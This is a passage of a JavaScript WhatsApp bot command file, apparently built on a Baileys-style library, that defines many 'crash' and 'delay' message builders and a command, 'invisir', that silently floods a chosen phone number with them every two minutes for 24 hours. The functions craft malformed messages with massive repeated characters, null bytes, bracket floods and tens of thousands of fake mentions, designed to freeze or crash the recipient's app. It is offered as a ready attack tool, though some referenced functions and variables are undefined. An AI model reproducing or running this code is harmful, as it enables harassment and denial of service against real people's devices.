          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              mentionedJid: [target, "13135550002@s.whatsapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net",
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast"
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: "killertzy",
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: "{[".repeat(500), 
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: "]}".repeat(500),
              subtitle: "Primis",
              hasMediaAttachment: false,
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              messageParamsJson: "{[".repeat(500),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" }
              ],
              messageParamsJson: "]}".repeat(500)
            })
          })
        }
      }
    };

    await prim.sendMessage(target, message);
    await prim.relayMessage(target, listMsg.viewOnceMessage.message, { messageId: generateMessageID() });

  } catch (e) {
    console.error("Gagal kirim DelaFreezCloseRelay:", e);
  }
}



async function BetaTester(target, mention) {
let mentionList = Array.from({ length:2000 }, 
(_, d) => `1313555000${d + 1}@s.whatsapp.net`);
let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
 message: {
  messageContextInfo: {
   messageSecret: crypto.randomBytes(32)
},
 interactiveResponseMessage: {
  body: {
   text: "Primis",
},
nativeFlowResponseMessage: {
 name: "galaxy_message",
  paramsJson: "\u0003".repeat(5000),
   version: 3
},
contextInfo: {
isChannelMessage: true, 
 mentionedJid: mentionedList,
  isForwarded: true,
   forwardingScore: 9999,
    forwardedNewsletterMessageInfo: {
     newsletterName: ".¿",
      newsletterJid: "25002008@newsletter",
       serverMessageId: 1
}
}
}
}
}
}, {});
  
  await prim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await prim.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
             type: 25
          }
        }
      }
    },
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "Empire Dilay" },
          content: undefined
        }
      ]
    });
  }
}


async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await prim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await prim.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
    }
    
    async function delayMakerInvisible(target) {
let venomModsData = JSON.stringify({
status: true,
criador: "VenomMods",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebconnetUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let stanza = [{
attrs: {
biz_bot: "1"
},
tag: "bot"
}, {
attrs: {},
tag: "biz"
}];
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 3.2,
isStatusBroadcast: true,
statusBroadcastJid: "status@broadcast",
badgeChat: {
unreadCount: 9999
}
},
forwardedNewsletterMessageInfo: {
newsletterJid: "proto@newsletter",
serverMessageId: 1,
newsletterName: `🎭⃟༑⌁⃰𝐒𝐪𝐮𝐢͢𝐜𝐡𝐲 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉${"🎭⃟༑⌁⃰𝐒𝐪𝐮𝐢͢𝐜𝐡𝐲 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉".repeat(10)}`,
contentType: 3,
accessibilityText: `🎭⃟༑⌁⃰𝐒𝐪𝐮𝐢͢𝐜𝐡𝐲 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉 ${"﹏".repeat(102002)}`
},
interactiveMessage: {
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
dataSharingContext: {
showMmDisclosure: true
},
participant: "0@s.whatsapp.net",
mentionedJid: ["13135550002@s.whatsapp.net"]
},
body: {
text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_method",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "call_permission_request",
buttonParamsJson: venomModsData + "".repeat(9999),
voice_call: "call_galaxy"
}, {
name: "form_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_learn_more",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_transaction_details",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_fbpin_reset",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "catalog_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_info",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_order",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "send_location",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payments_care_csat",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "view_product",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_settings",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "address_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "automated_greeting_message_view_catalog",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "open_webview",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "message_with_link_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_costum",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "extensions_message_v2",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "landline_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "mpm",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_copy",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_url",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_and_pay",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}]
}
}
},
additionalNodes: stanza,
stanzaId: `stanza_${Date.now()}`
}
}
await prim.relayMessage(target, message, {
participant: {
jid: target
}
});
}

async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Squichy Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await prim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await prim.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Squichy Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await prim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function CrashBeta(target) {
    const pler = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          buttonsMessage: {
            headerType: 1,
            contentText: "Squichy Crash ⨶" + "ꦾ".repeat(95000),
            buttons: [
              {
                buttonId: "🩸",
                buttonText: {
                  displayText: "\r".repeat(1020000)
                },
                type: 1
              }
            ],
            messageParamsJson: "{".repeat(10000),
            contextInfo: {
              remoteJid: "status@broadcast",
              mentionedJid: Array.from({ length: 1901 }, () => Math.random().toString(36) + "@s.whatsapp.net"),
              participant: target,
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: 
"1@newsletter",
                newsletterName: "🩸𝓬𝓪𝓵𝓵 𝓶𝓮 𝓟𝓻𝓲𝓶𝓲𝓼🩸",
                businessOwnerJid: target
              },
              quotedMessage: {
                contactMessage: {
                  displayName: null,
                  vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:ArsyilNotDeveloper\nTEL;type=CELL:0\nEND:VCARD"
                }
              },
              stanzaId: "null_" + Date.now()
            }
          }
        }
      }
    }, { userJid: target });

    await prim.relayMessage(target, pler.message, {
      messageId: pler.key.id,
      userJid: target
    });

    await new Promise(resolve => setTimeout(resolve, 2000));
}

async function KresKontak(target) {
  const ganteng = "ꦽ".repeat(10000)

  const PouMods = `BEGIN:VCARD
VERSION:3.0
N:;DsPrimis;;;
FN:DsPrimis
ORG:Primis half cooked${ganteng}
TITLE:
item1.TEL;type=Ponsel;waid=50940938083:50944780574
item1.X-ABLabel:Primis
END:VCARD`

  const kontak = Array.from({ length: 30 }, () => ({
    displayName: "Primis",
    vcard: PouMods
  }))

  const Pou = 5 * 1000
  const kamiya = 85

  for (let p = 0; p < kamiya; p++) {
    try {

      await prim.relayMessage(
        target,
        {
          contactsArrayMessage: {
            displayName: "‎Primis" + "ꦽ".repeat(9000),
            contacts: kontak,
            contextInfo: {
              mentionedJid: Array.from({ length: 2000 }, (_, p) => `6285983729${p + 1}@s.whatsapp.net`),
              remoteJid: "D5 - Primis ¿?",
              forwardingScore: 999999,
              isForwarded: true,

              forwardedNewsletterMessageInfo: {
                newsletterJid: "0@newsletter",
                serverMessageId: 1,
                newsletterName: "Primis"
              },

              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: 7205
                }
              },

              statusAttributions: [
                {
                  type: "STATUS_MENTION",
                  music: {
                    authorName: "DsPrimis",
                    songId: "1137812656623908",
                    title: "\u0000".repeat(1000),
                    author: "\x10".repeat(1000),
                    artistAttribution: "https://t.me/dsprimis",
                    isExplicit: true
                  }
                }
              ]
            }
          }
        },
        { participant: { jid: target } }
      )

      if (p < kamiya - 1) {
        await new Promise(resolve => setTimeout(resolve, Pou))
      }

    } catch (err) {
      console.log(err)
    }
  }
}

async function AdminBokep(prim, target) {
  if (! prim?.relayMessage) {
    console.log("Socket belum siap");
    return;
  }

  const toxic =
    "ꦾ".repeat(100000) +
    "𑇂𑆵𑆴𑆿".repeat(50000) +
    "\u0000".repeat(120000) +
    "ោ៝".repeat(60000) +
    "كن صادقاً مع نفسك ومع الآخرين".repeat(30000);

  const interactiveMsg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: { title: toxic.substring(0, 3000) },
          body: { text: toxic.substring(0, 50000) },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(20000),
            buttons: [
              { name: "single_select", buttonParamsJson: "\u0000".repeat(10000) },
              { name: "galaxy_message", buttonParamsJson: JSON.stringify({ data: "X".repeat(20000) }) },
              { name: "payment_method", buttonParamsJson: "\u0000".repeat(10000) },
              { name: "catalog_message", buttonParamsJson: "\u0000".repeat(10000) }
            ]
          },
          contextInfo: {
            mentionedJid: [target, ...Array.from({ length: 1000 }, (_, i) => `1${i}@s.whatsapp.net`)],
            forwardingScore: 9999,
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 999999999
              }
            }
          }
        }
      }
    }
  };

  const newsMsg = {
  botInvokeMessage: {
    message: {
      newsletterAdminInviteMessage: {
        newsletterJid: "1@newsletter",
        newsletterName: "🩸 ༑ 𝗦𝗤𝗨𝗜𝗖𝗛𝗬 炎 𝗥𝗫⟅ ༑ 🩸" + "𑜦𑜠".repeat(11000),
        jpegThumbnail: null,
        caption: toxic.substring(0, 50000),              
        inviteExpiration: Date.now() + 9999999999
      }
    }
  }
};

  const PouMsg = generateWAMessageFromContent(target, {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "🩸 ༑ 𝗦𝗤𝗨𝗜𝗖𝗛𝗬 炎 𝗥𝗫⟅ ༑ 🩸" + "𑜦𑜠".repeat(11000),
      jpegThumbnail: null,
      caption: "🩸 ༑ 𝗦𝗤𝗨𝗜𝗖𝗛𝗬 炎 𝗥𝗫⟅ ༑ 🩸",
      timestamp: "1760964628",
    }
  }, {});

  await prim.relayMessage(target, interactiveMsg, { messageId: crypto.randomBytes(10).toString('hex') });
  await prim.relayMessage(target, newsMsg, { messageId: crypto.randomBytes(10).toString('hex') });
  await prim.relayMessage(target, PouMsg.message, { messageId: PouMsg.key.id });
}

async function blankPACKING(prim, target) {
  await prim.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "./Primis" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "./Primis" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "woi",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "maklo",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "./Primis" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}


//     COMMANDE

export default {
  name: "invisir",
  alias: ["attaque", "invisi"],
  description: "Carnage-Bug 24h silencieux (aucune confirmation) sur un numéro",

  async execute(sock, msg, args, from) {
    // Décommentez les lignes suivantes pour restreindre au propriétaire
    // const sender = msg.key.remoteJid.endsWith("@g.us") ? msg.key.participant : msg.key.remoteJid;
    // const senderNum = sender.split("@")[0].replace(/[^0-9]/g, "");
    // const ownerNum = global.owners?.[0];
    // if (senderNum !== ownerNum) {
    //   return sock.sendMessage(from, { text: "❌ Seul le propriétaire peut utiliser cette commande." });
    // }

    let targetNumber = args?.[0] || "";
    if (!targetNumber) {
      return sock.sendMessage(from, { text: "❌ Numéro manquant\n.carnage-bug 237xxxxxxxx" }, { quoted: msg });
    }

    targetNumber = targetNumber.replace(/[^0-9]/g, "");
    if (targetNumber.length < 8) {
      return sock.sendMessage(from, { text: "❌ Numéro invalide" }, { quoted: msg });
    }

    const target = targetNumber + "@s.whatsapp.net";

    const durationHours = 24;
    const intervalMinutes = 2;
    const totalExecutions = Math.floor((durationHours * 60) / intervalMinutes);

    let count = 0;

    const actions = [
      intdress, iNTofmSqL, iNTxSqL, dandelionlay, NullMemek,
      gsCp, jokowi, crashnotif, invisblekontak, Delaybulldor,
      CrashSqlV2, Delaymaklo, tes, Vsx, ZenoEphemerals,
      VsxCrashDelay, D9XDELAYV2, Available01, ofmCrashSql,
      blankv1, Abcefghh, HomoSigmaWing, xxx, HardBukQIM,
      ofmEr, vfz, epcihDiley, DelaFreezCloseRelay, BetaTester,
      protocolbug3, delayMakerInvisible, VampBroadcast, bulldozer,
      CrashBeta, KresKontak, AdminBokep, blankPACKING
    ];

    // Lancement silencieux (aucun message de confirmation)
    const interval = setInterval(async () => {
      count++;
      for (const fn of actions) {
        try {
          if (typeof fn === "function") {
            await fn(sock, target);
          }
        } catch (err) {
          console.error(`Erreur fonction ${fn.name || ""}`, err);
        }
      }
      if (count >= totalExecutions) {
        clearInterval(interval);
        if (global.carnageInterval === interval) global.carnageInterval = null;
      }
    }, intervalMinutes * 60 * 1000);

    global.carnageInterval = interval;

    // Aucun message envoyé après démarrage (silencieux)
    console.log(`[CARNAGE] Démarré silencieusement sur ${targetNumber} pour 24h`);
  }
};
